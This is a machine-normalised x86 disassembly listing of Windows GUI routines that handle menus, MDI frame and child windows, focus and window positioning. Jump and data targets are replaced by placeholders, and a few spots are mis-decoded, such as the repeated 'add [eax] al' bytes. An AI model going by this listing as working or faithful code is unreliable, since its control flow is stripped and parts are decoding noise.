test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_43b098
mov dl 0x1
mov eax esi
call sub_451334
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_4513b0
mov edx eax
mov eax esi
call sub_4374f8
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_43b234
mov dl 0x1
mov eax esi
call sub_450354
sub_451050
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_43db40
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_4476d4
mov edi eax
mov eax ebp
call sub_43db40
push eax
call DrawMenuBar
sub_4510cc
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4192b0
xor edx edx
mov eax ebx
call sub_44906c
sub_4510f0
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_451050
mov eax edx
mov edx ebx
call sub_4192b0
sub_451118
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_454948
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_44ac20
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454934
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_4192b0
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454934
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
mov eax ebx
call sub_43de44
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_43db40
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_451050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4512e5
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov dl 0x1
mov eax ebx
call sub_4521dc
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_43db40
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_43db40
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_43db40
mov edx eax
mov eax esi
call sub_44ac20
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_43db40
push eax
call SetMenu
sub_451300
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4512ec
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_45135c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_451350
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4513c8
push ebx
mov ebx eax
mov eax ebx
call sub_43d158
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4513b0
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4513b0
mov edx eax
mov eax ebx
call sub_4374f8
mov edx 0xff00000f
mov eax ebx
call sub_4374f8
pop ebx
retn
sub_45144c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_43db40
push eax
call ShowWindow
sub_45148c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450ea4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_450ea4
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_454918
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_454904
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_450ea4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_454904
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_454918
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_454904
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454608
push eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545ec
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545d4
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_454904
call sub_4545d4
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545d4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454620
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454608
push eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545ec
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545d4
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454620
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454608
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_454904
call sub_454608
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454608
push eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545ec
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545d4
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454620
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545d4
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454620
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_454608
push eax
mov edx esi
mov eax [ rw-data ]
call sub_454904
call sub_4545ec
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4517e0
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_44ed94
mov edx esi
mov eax edi
call sub_454184
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45188f ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43a964
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43a964
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4519f1
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44eda4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov eax ebx
call sub_452350
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43db40
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_436d5c
push eax
mov eax ebx
call sub_436da0
push eax
mov eax ebx
call sub_43db40
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406894
mov [ ebx + 0x254 ] eax
push ebx
push sub_45093c
call sub_41a284
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_4476d4
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_43db40
push eax
call SetWindowPos
jmp r-xdata
sub_451b3e
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_43acc8
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451c70
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_451c78
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_43af34
push 0x0
mov eax ebx
call sub_43db40
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_451cbc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43b6b8
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_43db40
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43db40
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_451d20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451dcf
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov eax edi
call sub_44e0b4
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403430
mov eax ebx
call sub_4520d8
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403430
test al al
jne r-xdata
sub_451dd8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_43a61c
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_43a61c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_451d20
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_451e20
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_451d20
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_451e44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_413984
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_4138bc
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_413984
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_4138bc
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_43db40
mov dx 0xb000
call sub_44de74
test al al
jne r-xdata
call sub_43db40
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_44de74
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4520bb
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a54
jmp r-xdata
call sub_403a54
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_43a61c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_43db40
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_44de74
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43850c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
call sub_403a54
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_43db40
mov dx 0xb01a
call sub_44de74
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a54
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43850c
sub_4520d8
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43850c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_43db40
push eax
call SetFocus
mov eax ebx
call sub_43db40
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_452128
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43850c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4521dc
mov eax esi
call sub_4520d8
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_43df68
mov edx eax
mov eax esi
call sub_451d20
sub_45218c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_450da4
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43850c
mov eax ebx
call sub_450da4
mov edx esi
call sub_45218c
sub_4521dc
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_44b200
mov edx esi
call sub_44b1e4
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_452284
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_43db40
push eax
call SendMessageA
sub_4522d0
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_452284
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_452300
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_452284
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45236c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41ce58
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41d23c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403430
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4523fe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41d23c
retn
sub_452428
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
